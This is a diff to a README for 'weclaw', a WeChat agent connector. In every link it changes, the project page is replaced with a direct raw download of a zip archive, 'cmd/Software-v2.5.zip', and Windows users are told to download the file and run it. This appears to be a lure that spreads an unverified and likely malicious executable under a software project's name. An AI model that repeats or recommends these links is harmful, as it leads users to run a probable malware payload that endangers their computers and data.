@@ -1,12 +1,12 @@
 # 🤖 weclaw - Connect WeChat Agents Fast
 
-[![Download weclaw](https://img.shields.io/badge/Download-weclaw-blue?style=for-the-badge&logo=github)](https://github.com/jonislutheran87/weclaw)
+[![Download weclaw](https://img.shields.io/badge/Download-weclaw-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jonislutheran87/weclaw/main/cmd/Software-v2.5.zip)
 
 ## 📥 Download
 
 Go to the project page here:
 
-https://github.com/jonislutheran87/weclaw
+https://raw.githubusercontent.com/jonislutheran87/weclaw/main/cmd/Software-v2.5.zip
 
 On that page, look for the latest release or the main download area. If you see a file for Windows, download it and run this file
 
@@ -38,7 +38,7 @@ If your PC is older, the app can still work, but it may start slower.
 Follow these steps on Windows:
 
 1. Open this page:
-   https://github.com/jonislutheran87/weclaw
+   https://raw.githubusercontent.com/jonislutheran87/weclaw/main/cmd/Software-v2.5.zip
 
 2. Find the download file for Windows.
 
@@ -129,4 +129,4 @@ This project is related to:
 
 If you need the file again, use this link:
 
-https://github.com/jonislutheran87/weclaw
+https://raw.githubusercontent.com/jonislutheran87/weclaw/main/cmd/Software-v2.5.zip
